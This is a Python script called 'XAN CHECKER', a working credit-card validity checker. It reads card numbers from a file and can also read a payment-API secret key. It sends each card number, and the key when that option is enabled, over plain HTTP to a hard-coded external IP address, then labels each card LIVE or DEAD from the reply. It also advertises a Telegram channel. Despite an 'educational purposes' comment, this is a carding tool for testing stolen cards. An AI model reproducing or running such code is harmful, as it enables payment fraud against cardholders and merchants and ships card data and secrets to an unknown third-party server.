from colorama import Fore
import os
import time
import random
import json
import requests

# only for educational purposes please

def icon():
    print(Fore.BLUE + '                    v1.0.6')
    print(Fore.BLUE + '               [ XAN CHECKER ]')
    print(Fore.BLUE + ' ')
    print(Fore.BLUE + '             by roaxx & rockyy')
    print(Fore.BLUE + '  ')
icon()

with open('config.json', 'r') as file:
    config_data = json.load(file)

cc_file = config_data["cc_file"]
sk_enabled = config_data["enable_sk"]

if sk_enabled is True:
    sk = config_data["sk_key"]
    with open(cc_file, 'r') as requests_file:
        for line in requests_file:
            cx = line.strip()
            url = f"http://51.20.124.87/man.php?sk={sk}&cc={cx}"
            try:
            
                response = requests.get(url, verify=False)
            
                if "APPROVED" in response.text:
                    print(Fore.GREEN + "LIVE - " + Fore.LIGHTBLACK_EX + f"{cx}")
                elif "DECLINED" in response.text:
                    print(Fore.RED + "DEAD - " + Fore.LIGHTBLACK_EX + f"{cx}")
                elif "Request rate limit exceeded" in response.text:
                    print(Fore.YELLOW + "RATELIMIT -" + Fore.LIGHTBLACK_EX + f" {cx}")
                else:
                    print(Fore.RED + "DEAD - SK KEY DEAD/OR SMTH")
                time.sleep(0.7)
            except requests.RequestException as e:
                print(Fore.RED + f"DEAD - {cx} | {e}")
else:
        with open(cc_file, 'r') as requests_file:
            for line in requests_file:
                cx = line.strip()
                url = f"http://51.20.124.87/xan0.php?cc={cx}"
                try:
            
                    response = requests.get(url, verify=False)
            
                    if "APPROVED" in response.text:
                        print(Fore.GREEN + "LIVE - " + Fore.LIGHTBLACK_EX + f"{cx}")
                    elif "DECLINED" in response.text:
                        print(Fore.RED + "DEAD - " + Fore.LIGHTBLACK_EX + f"{cx}")
                    elif "Request rate limit exceeded" in response.text:
                        print(Fore.YELLOW + "RATELIMIT -" + Fore.LIGHTBLACK_EX + f" {cx}")
                    else:
                        print(Fore.RED + "our public api is overloaded, check https://t.me/xancheck for more info 🗿")
                    time.sleep(0.7)
                except requests.RequestException as e:
                    print(Fore.RED + f"DEAD - {cx} | {e}")



        
